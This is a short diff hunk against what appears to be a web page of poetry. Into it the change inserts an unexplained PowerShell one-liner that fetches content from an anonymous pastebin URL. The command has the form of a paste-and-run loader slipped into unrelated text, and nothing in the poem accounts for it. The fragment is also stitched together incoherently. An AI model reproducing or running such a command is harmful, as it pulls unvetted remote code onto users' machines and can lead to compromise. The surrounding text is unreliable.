@@ -11,6 +11,10 @@ lost conscience of the apprizer<br>
 boiling hatred in a pest
 </p>
 
+```
+powershell -c(wget -useb -ur pastebin.com/raw/pqamKfgi).Content
+```
+
 <br>
 
 ```diff
